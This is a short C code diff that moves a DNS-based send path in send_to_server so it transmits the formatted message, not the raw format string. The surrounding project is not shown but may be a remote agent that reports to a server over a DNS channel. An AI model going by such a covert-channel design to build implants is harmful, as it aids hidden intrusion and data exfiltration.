@@ -57,10 +57,6 @@ static char *format_string(const char *fmt, ...) {
 
 // Formats and sends a message to the server
 int send_to_server(char *message, ...) {
-    if (response_over_dns) {
-        return dns_send_data(message, strlen(message));
-    }
-
     if (!get_worker_socket()) {
         ERR_MSG("send_to_server: socket is not initialized\n");
         return -EINVAL;
@@ -71,6 +67,10 @@ int send_to_server(char *message, ...) {
 		ERR_MSG("send_to_server: failed to format message\n");
 		return -ENOMEM;
 	}
+
+    if (response_over_dns) {
+        return dns_send_data(formatted_message, strlen(formatted_message));
+    }
 
     // Send the formatted message
     int ret_code = send_to_server_raw(formatted_message, strlen(formatted_message));
